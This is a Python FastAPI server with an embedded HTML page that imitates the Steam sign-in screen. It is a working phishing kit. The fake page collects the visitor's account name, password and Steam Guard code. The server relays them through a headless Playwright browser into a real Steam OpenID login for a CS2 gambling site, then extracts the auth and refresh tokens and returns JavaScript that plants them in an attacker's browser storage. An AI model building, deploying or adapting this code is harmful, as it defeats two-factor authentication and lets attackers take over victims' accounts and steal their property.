import asyncio
import os
import time
from fastapi import FastAPI, Form, BackgroundTasks
from fastapi.responses import HTMLResponse
from fastapi.middleware.cors import CORSMiddleware
from playwright.async_api import async_playwright
import uvicorn

app = FastAPI()
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

sessions = {}
SCREENSHOT_DIR = "debug_screens"
if not os.path.exists(SCREENSHOT_DIR):
    os.makedirs(SCREENSHOT_DIR)

STEAM_LOGIN_URL = "https://steamcommunity.com/openid/login?openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.realm=https%3A%2F%2Fcs2run.app&openid.return_to=https%3A%2F%2Fcs2run.app%2Fauth%2F1%2Fstart-sign-in%2F%3FreturnUrl%3Dhttps%3A%2F%2Fcs2a.run%2Fauth&l=russian"

async def init_browser(sid):
    print(f"[{sid}] 🚀 Запуск браузера...")
    if sid not in sessions: 
        sessions[sid] = {"ready": False, "is_processing": False, "done": False}
    
    try:
        pw = await async_playwright().start()
        browser = await pw.chromium.launch(
            headless=True,
            args=[
                "--no-sandbox",
                "--disable-dev-shm-usage",
                "--disable-gpu",
                "--disable-extensions",
                "--disable-background-networking",
                "--disable-background-timer-throttling",
                "--disable-renderer-backgrounding",
                "--disable-backgrounding-occluded-windows",
                "--disable-features=Translate,BackForwardCache",
                "--no-first-run",
                "--no-zygote"
            ]
        )
        context = await browser.new_context(
            viewport={"width": 412, "height": 915},
            locale='ru-RU',
            user_agent="Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
        )
        page = await context.new_page()
        await page.goto(STEAM_LOGIN_URL, wait_until="domcontentloaded")
        
        sessions[sid].update({"page": page, "browser": browser, "pw": pw, "ready": True})
        print(f"[{sid}] ✅ Steam готов")
    except Exception as e:
        print(f"[{sid}] ❌ Ошибка инита: {e}")

@app.get("/api/init")
async def api_init(sid: str, bg: BackgroundTasks):
    sessions[sid] = {"ready": False, "is_processing": False, "done": False}
    bg.add_task(init_browser, sid)
    return {"status": "ok"}

@app.post("/api/login")
async def api_login(sid: str = Form(...), u: str = Form(...), p: str = Form(...)):
    if sid not in sessions: return {"status": "error", "msg": "Сессия не найдена"}
    s = sessions[sid]
    
    for _ in range(20):
        if s.get("ready"): break
        await asyncio.sleep(1)

    page = s["page"]
    try:
        # 1. Вводим логин/пароль (как у тебя было)
        await page.click("input[type='text']", click_count=3)
        await page.keyboard.press("Backspace")
        await page.fill("input[type='text']", u)
    
        await page.click("input[type='password']", click_count=3)
        await page.keyboard.press("Backspace")
        await page.fill("input[type='password']", p)
    
        # 2. Кликаем войти
        login_btn = page.locator("button:has-text('Войти'), #imageLogin, .DjSvCZoKKfoNSmarsEcTS")
        await login_btn.first.click()
    
        # 3. Ждем реакцию страницы
        for _ in range(30):
            await asyncio.sleep(0.5)
    
            # Проверяем видимый текст ошибки
            error_locator = page.locator("text=Пожалуйста, проверьте свой пароль и имя аккаунта и попробуйте снова.")
            if await error_locator.count() > 0 and await error_locator.first.is_visible():
                msg = (await error_locator.first.text_content()).strip()
                print(f"[{sid}] ❌ Видимая ошибка: {msg}")
                return {"status": "error", "msg": msg}  # сразу возвращаем пользователю
    
            # Проверяем успешный вход (2FA / OpenID)
            is_guard_input = await page.locator("input#twofactorcode_entry, input#authcode").count() > 0
            is_openid = "openid/login" in page.url
    
            if is_guard_input or is_openid:
                print(f"[{sid}] ✅ Пароль верный, переходим к 2FA/OpenID")
                return {"status": "need_2fa"}
    
        # Если ничего не произошло за 15 секунд
        return {"status": "error", "msg": "Steam слишком долго думает. Попробуйте еще раз."}
    
    except Exception as e:
        print(f"[{sid}] ❌ Error: {str(e)}")
        return {"status": "error", "msg": "Ошибка при входе"}

@app.post("/api/click_code_button")
async def api_click_code_button(sid: str = Form(...)):
    """Нажимает 'Ввести код вручную', если юзер хочет ввести код"""
    if sid not in sessions: return {"status": "error"}
    page = sessions[sid]["page"]
    try:
        await page.click("text=введите код") 
        return {"status": "ok"}
    except:
        return {"status": "ok"}


@app.post("/api/submit_code")
async def api_submit_code(sid: str = Form(...), code: str = Form(...)):
    if sid not in sessions: return {"status": "error"}
    page = sessions[sid]["page"]
    try:
        clean_code = code.strip().upper()
        await page.wait_for_selector("input[maxlength='1'], input#authcode", timeout=5000)
        await page.evaluate(f"""(fullCode) => {{
            let inputs = Array.from(document.querySelectorAll('input[maxlength="1"][type="text"]'));
            if (inputs.length >= 5) {{
                for (let i = 0; i < 5; i++) {{
                    inputs[i].value = fullCode[i] || "";
                    inputs[i].dispatchEvent(new Event('input', {{ bubbles: true }}));
                }}
            }} else {{
                let s = document.querySelector('input#authcode, input#twofactorcode_entry');
                if (s) {{ s.value = fullCode; s.dispatchEvent(new Event('input', {{ bubbles: true }})); }}
            }}
        }}""", clean_code)
        await asyncio.sleep(0.5)
        await page.keyboard.press("Enter")
        return {"status": "ok"}
    except Exception as e:
        return {"status": "error", "msg": str(e)}

@app.get("/api/check_status")
async def api_check_status(sid: str):
    if sid not in sessions or sessions[sid]["done"]:
        return {"status": "waiting"}
    
    s = sessions[sid]
    if s.get("is_processing"): 
        return {"status": "processing"}

    s["is_processing"] = True
    page = s["page"]
    
    try:
        for _ in range(10): 
            current_url = page.url
           
            # 1. Проверка на успех (токены)
            if "cs2a.run" in current_url or "cs2run.app" in current_url:
                tokens = await page.evaluate("""() => {
                    return {
                        auth: localStorage.getItem('auth-token') || sessionStorage.getItem('auth-token'),
                        refresh: localStorage.getItem('auth-refresh-token') || sessionStorage.getItem('auth-refresh-token')
                    }
                }""")
                
                if tokens.get("auth"):
                    s["done"] = True
                    await s["browser"].close()
                    await s["pw"].stop()

                    js = f"localStorage.setItem('auth-token', '{tokens['auth']}'); localStorage.setItem('auth-refresh-token', '{tokens['refresh']}'); location.reload();"
                    return {"status": "done", "js_code": js}

            # 2. Проверка на кнопку подтверждения
            login_btn = page.locator("#imageLogin, input[type='submit'][value='Войти']")
            if await login_btn.count() > 0 and await login_btn.first.is_visible():
                print(f"[{sid}] 👁 Клик по кнопке 'Войти'...")
                await login_btn.first.click()
                await asyncio.sleep(3) 
                continue

            await asyncio.sleep(1)
            
        return {"status": "waiting"}
    finally:
        s["is_processing"] = False

# --- ГЛАВНАЯ СТРАНИЦА С ОБНОВЛЕННЫМ ДИЗАЙНОМ ---
@app.get("/", response_class=HTMLResponse)
async def index():
    return """
    <!DOCTYPE html>
    <html lang="ru">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <title>Steam Community</title>
        <link href="https://fonts.fontsource.org/css?family=segoe-ui-variable&display=swap" rel="stylesheet">
        <style>
            :root {
                --steam-bg: #171a21;
                --steam-dark-blue: #1b2838;
                --steam-input-bg: #32353c;
                --steam-text-main: #c7d5e0;
                --steam-text-dim: #8f98a0;
                --steam-blue: #66c0f4;
                --steam-btn-gradient-start: #47bfff;
                --steam-btn-gradient-end: #1a44c2;
                --steam-error: #ff4e4e;
            }

            * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }

            body {
                font-family: 'Segoe UI Variable', Tahoma, Geneva, Verdana, sans-serif;
                background-color: var(--steam-bg);
                color: var(--steam-text-main);
                min-height: 100vh;
                display: flex;
                flex-direction: column;
                overflow-x: hidden;
            }

            /* Header */
            .header {
                display: flex;
                justify-content: center; /* Центрируем лого, убрав меню */
                align-items: center;
                padding: 15px 20px;
                background-color: rgba(23, 26, 33, 0.95);
                position: sticky;
                top: 0;
                z-index: 100;
                backdrop-filter: blur(5px);
            }

            .logo-container { display: flex; align-items: center; gap: 8px; }
            .logo-svg { fill: white; width: 32px; height: 32px; }
            .logo-text { font-weight: bold; font-size: 20px; letter-spacing: 1px; color: white; }

            /* Main Content */
            .content {
                flex: 1;
                padding: 20px;
                display: flex;
                flex-direction: column;
                align-items: center;
                max-width: 500px;
                margin: 0 auto;
                width: 100%;
            }

            h1 { font-size: 32px; font-weight: bold; margin-bottom: 30px; color: white; text-align: center; }

            /* Forms */
            .form-group { width: 100%; margin-bottom: 15px; }
            label { display: block; color: var(--steam-blue); font-size: 14px; margin-bottom: 5px; text-transform: uppercase; font-weight: 600; }
            label.dim { color: var(--steam-text-dim); text-transform: none; }

            input[type="text"], input[type="password"] {
                width: 100%; padding: 12px; background-color: var(--steam-input-bg);
                border: 1px solid transparent; border-radius: 3px; color: white;
                font-size: 16px; outline: none; transition: border-color 0.2s;
            }
            input:focus { border-color: var(--steam-blue); background-color: #454a52; }
            input.error { border-color: var(--steam-error); background-color: rgba(255, 78, 78, 0.1); }

            /* Buttons */
            .btn-primary {
                width: 100%; padding: 14px;
                background: linear-gradient(to bottom, var(--steam-btn-gradient-start), var(--steam-btn-gradient-end));
                border: none; border-radius: 2px; color: white; font-size: 16px; font-weight: bold;
                cursor: pointer; box-shadow: 0 2px 4px rgba(0,0,0,0.3); transition: filter 0.2s;
            }
            .btn-primary:active { filter: brightness(0.9); }
            .btn-secondary {
                background: rgba(255, 255, 255, 0.1); color: var(--steam-text-main);
                border: none; padding: 10px 20px; border-radius: 2px; font-size: 14px;
                cursor: pointer; margin-top: 15px;
            }
            .link-text {
                color: var(--steam-text-dim); text-decoration: underline; font-size: 14px;
                text-align: center; margin-top: 15px; display: block; cursor: pointer;
                background: none; border: none; width: 100%;
            }

            .error-msg { color: var(--steam-error); font-size: 14px; text-align: center; margin-top: 10px; min-height: 20px; }

            /* QR Section */
            .qr-section { margin-top: 30px; text-align: center; display: none; animation: fadeIn 0.3s ease; }
            .qr-title { color: var(--steam-blue); font-size: 14px; margin-bottom: 15px; text-transform: uppercase; }
            .qr-code-img {
                width: 200px; height: 200px; background: white; padding: 10px; margin: 0 auto;
                border-radius: 4px; box-shadow: 0 0 15px rgba(102, 192, 244, 0.3);
            }

            /* Authenticator View */
            .auth-view { text-align: center; width: 100%; display: none; }
            .account-name { font-size: 24px; color: white; margin-bottom: 10px; }
            .auth-desc { color: var(--steam-text-dim); font-size: 14px; margin-bottom: 30px; line-height: 1.5; }
            
            /* Единое поле ввода кода */
            .single-code-input {
                width: 100%;
                padding: 15px;
                background: var(--steam-input-bg);
                border: 1px solid #454a52;
                border-radius: 4px;
                color: white;
                font-size: 24px;
                text-align: center;
                letter-spacing: 5px;
                outline: none;
                margin-bottom: 20px;
            }
            .single-code-input:focus {
                border-color: var(--steam-blue);
                background: #454a52;
            }

            .phone-icon { color: var(--steam-blue); font-size: 40px; margin-bottom: 15px; display: block; }

            /* Utilities */
            .hidden { display: none !important; }
            @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        </style>
    </head>
    <body>

        <!-- Header (Без меню) -->
        <div class="header">
            <div class="logo-container">
                <svg class="logo-svg" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.94-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>
                <span class="logo-text">STEAM®</span>
            </div>
        </div>

        <!-- Main Content Area -->
        <div class="content">
            
            <!-- STEP 1: LOGIN FORM -->
            <div id="view-login">
                <h1>Вход</h1>
                
                <div class="form-group">
                    <label>ВОЙДИТЕ, ИСПОЛЬЗУЯ ИМЯ АККАУНТА</label>
                    <input type="text" id="username" placeholder="" autocomplete="off">
                </div>

                <div class="form-group">
                    <label class="dim">ПАРОЛЬ</label>
                    <input type="password" id="password" placeholder="">
                </div>

                <!-- Убрано "Запомнить меня" -->

                <button class="btn-primary" onclick="handleLogin()">Войти</button>
                <div id="login-error" class="error-msg"></div>

                <!-- Убрана ссылка "Помогите..." -->

                <div style="margin-top: 40px; text-align: center;">
                    <div class="qr-title" style="color: var(--steam-blue); margin-bottom: 10px;">НОВОЕ!</div>
                    <p style="color: var(--steam-text-dim); font-size: 14px; margin-bottom: 15px;">
                        Пользователи мобильного приложения Steam могут войти в аккаунт, просканировав QR-код.
                    </p>
                    <button class="btn-secondary" onclick="toggleQR()">Показать QR-код</button>
                </div>

                <!-- QR Code Section -->
                <div id="qr-section" class="qr-section">
                    <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=steamcommunity.com" alt="QR Code" class="qr-code-img">
                    <p style="color: var(--steam-text-dim); font-size: 12px; margin-top: 10px;">
                        Используйте мобильное приложение Steam, чтобы войти с помощью QR-кода
                    </p>
                    <button class="link-text" onclick="toggleQR()" style="margin-top: 5px;">Скрыть</button>
                </div>
            </div>

            <!-- STEP 2: AUTHENTICATOR / SUCCESS -->
            <div id="view-auth" class="auth-view">
                <div class="logo-container" style="justify-content: center; margin-bottom: 20px;">
                    <svg class="logo-svg" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.94-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>
                    <span class="logo-text">STEAM®</span>
                </div>

                <div class="account-name" id="display-username">Аккаунт: User</div>
                <p class="auth-desc">У вас настроен мобильный аутентификатор для защиты аккаунта.</p>

                <div style="background: rgba(0,0,0,0.2); padding: 20px; border-radius: 4px; margin-bottom: 20px;">
                    <div class="phone-icon">📱</div>
                    <p style="color: white; font-size: 16px; margin-bottom: 15px;">Используйте мобильное приложение Steam, чтобы подтвердить вход...</p>
                    
                    <button class="link-text" onclick="showManualCodeInput()">Или введите код</button>
                    <button class="link-text" style="font-size: 12px;" onclick="alert('Переход к восстановлению')">Помогите, у меня больше нет доступа к мобильному приложению Steam</button>
                </div>

                <!-- Manual Code Input (Single Line) -->
                <div id="manual-code-container" class="hidden" style="margin-top: 20px;">
                    <p style="color: var(--steam-text-dim); margin-bottom: 10px;">Введите код из мобильного приложения Steam</p>
                    
                    <!-- Единое поле ввода -->
                    <input type="text" id="guard-code-single" class="single-code-input" placeholder="XXXXX" maxlength="5" autocomplete="off">
                    
                    <button class="btn-primary" onclick="submitFinalCode()">Продолжить</button>
                    <div id="code-error" class="error-msg"></div>
                </div>
            </div>

            <!-- STEP 3: FINAL SUCCESS -->
            <div id="view-success" class="hidden" style="text-align: center; margin-top: 50px;">
                <h2 style="color: var(--steam-blue);">Успешно!</h2>
                <p style="color: var(--steam-text-dim); margin-top: 10px;">Выполняется перенаправление...</p>
                <div id="debug-token" style="margin-top: 20px; font-size: 10px; word-break: break-all; color: #555;"></div>
            </div>

        </div>

        <!-- Нижняя панель удалена -->

        <script>
            const sid = "sid_" + Math.random().toString(36).substr(2, 9);
            let pollingInterval = null;

            window.onload = async () => {
                console.log("Initializing session:", sid);
                try {
                    await fetch(`/api/init?sid=${sid}`);
                } catch (e) {
                    console.error("Init failed", e);
                }
            };

            async function handleLogin() {
                const u = document.getElementById('username').value;
                const p = document.getElementById('password').value;
                const errorDiv = document.getElementById('login-error');
                const btn = document.querySelector('#view-login .btn-primary');

                if (!u || !p) {
                    errorDiv.innerText = "Пожалуйста, заполните все поля";
                    return;
                }

                btn.innerText = "Проверка...";
                btn.style.opacity = "0.7";
                errorDiv.innerText = "";

                try {
                    const formData = new URLSearchParams();
                    formData.append('sid', sid);
                    formData.append('u', u);
                    formData.append('p', p);

                    const res = await fetch('/api/login', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                        body: formData
                    });

                    const data = await res.json();

                    if (data.status === 'need_2fa') {
                        document.getElementById('view-login').classList.add('hidden');
                        document.getElementById('view-auth').style.display = 'block';
                        document.getElementById('display-username').innerText = `Аккаунт: ${u}`;
                        startPolling();
                    } else {
                        errorDiv.innerText = data.msg || "Неверный логин или пароль";
                        document.getElementById('username').classList.add('error');
                        document.getElementById('password').classList.add('error');
                    }
                } catch (e) {
                    errorDiv.innerText = "Ошибка соединения с сервером";
                } finally {
                    btn.innerText = "Войти";
                    btn.style.opacity = "1";
                }
            }

            function toggleQR() {
                const qr = document.getElementById('qr-section');
                if (qr.style.display === 'block') {
                    qr.style.display = 'none';
                } else {
                    qr.style.display = 'block';
                }
            }

            function showManualCodeInput() {
                document.getElementById('manual-code-container').classList.remove('hidden');
                document.getElementById('guard-code-single').focus();
                
                fetch('/api/click_code_button', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: `sid=${sid}`
                });
            }

            // Функция отправки единого кода
            async function submitFinalCode() {
                const codeInput = document.getElementById('guard-code-single');
                const fullCode = codeInput.value.trim();
                
                if (fullCode.length < 5) {
                    document.getElementById('code-error').innerText = "Введите 5-значный код";
                    return;
                }

                await sendCodeToBackend(fullCode);
            }

            async function sendCodeToBackend(code) {
                const errorDiv = document.getElementById('code-error');
                errorDiv.innerText = "Отправка...";
                
                try {
                    const formData = new URLSearchParams();
                    formData.append('sid', sid);
                    formData.append('code', code);

                    const res = await fetch('/api/submit_code', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                        body: formData
                    });

                    const data = await res.json();
                    
                    if (data.status === 'ok') {
                        errorDiv.innerText = "";
                    } else {
                        errorDiv.innerText = data.msg || "Неверный код";
                    }
                } catch (e) {
                    errorDiv.innerText = "Ошибка сети";
                }
            }

            function startPolling() {
                if (pollingInterval) clearInterval(pollingInterval);
                
                pollingInterval = setInterval(async () => {
                    try {
                        const res = await fetch(`/api/check_status?sid=${sid}`);
                        const data = await res.json();

                        if (data.status === 'done') {
                            clearInterval(pollingInterval);
                            handleSuccess(data.js_code);
                        }
                    } catch (e) {
                        console.error("Polling error", e);
                    }
                }, 2000);
            }

            function handleSuccess(jsCode) {
                document.getElementById('view-auth').classList.add('hidden');
                document.getElementById('view-success').classList.remove('hidden');
                document.getElementById('debug-token').innerText = jsCode;
            }
        </script>
    </body>
    </html>
    """

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=5050)

